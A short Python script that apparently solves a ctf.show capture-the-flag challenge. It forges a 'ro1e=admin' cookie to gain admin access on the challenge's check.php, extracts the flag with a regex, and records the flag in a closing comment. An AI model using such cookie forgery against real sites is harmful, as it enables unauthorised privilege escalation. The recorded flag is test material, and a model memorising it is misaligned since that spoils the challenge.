import re
import requests

url = 'http://0723bd9d-fd33-4bcb-b712-9b466be44487.challenge.ctf.show'
headers = {'Cookie':'ro1e=admin;'} # 注意ro1e是1
data = {'username':'guest', 'password':'guest'}
r = requests.post(f'{url}/check.php', headers=headers, data=data)
print(r.text) 
flag_match = re.search(r'CTF\{[0-9a-zA-Z_\-]+\}', r.text)
if flag_match:
    flag = flag_match.group(0)
    print(flag)
# CTF{cookie_injection_is_fun}